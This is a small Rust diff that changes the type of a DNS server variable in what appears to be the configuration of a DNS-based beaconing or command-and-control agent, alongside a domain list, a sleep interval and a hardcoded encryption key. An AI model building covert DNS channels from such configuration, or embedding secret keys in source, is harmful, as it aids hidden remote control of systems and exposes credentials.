@@ -28,7 +28,7 @@ const DOMAINS: [&str; 7] = [
 pub static mut SLEEP: u64 = 5;
 
 //Address of the DNS Server to query
-pub static mut DNS_SERVER: &str = String::new();
+pub static mut DNS_SERVER: String = String::new();
 
 //Encryption key
 pub static ENCRYPTION_KEY: &str = "Ql60hqrp1NhiCzH8XZRaJkUy2mU7COgV";
